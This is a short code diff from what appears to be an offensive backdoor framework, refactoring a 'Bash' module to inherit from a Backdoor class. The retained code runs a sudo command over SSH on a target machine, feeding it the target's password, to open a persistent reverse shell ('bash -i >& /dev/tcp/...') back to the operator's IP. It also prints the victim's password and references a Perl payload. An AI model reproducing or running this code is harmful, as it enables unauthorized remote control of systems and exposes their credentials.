@@ -1,10 +1,6 @@
-from module import *
-import os
-import cmd
-from colorama import *
-from definitions import *
+from backdoor import *
 
-class Bash(Module):
+class Bash(Backdoor):
     prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
     
     def __init__(self, target, core):
@@ -33,14 +29,6 @@ class Bash(Module):
         print(GOOD + "Initializing backdoor...")
         self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.localIP + "/%s 0>&1" % port)
         print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)
-
-
-
-
-
-
-
-
 
 
         toW = 'perl/prsA.pl'
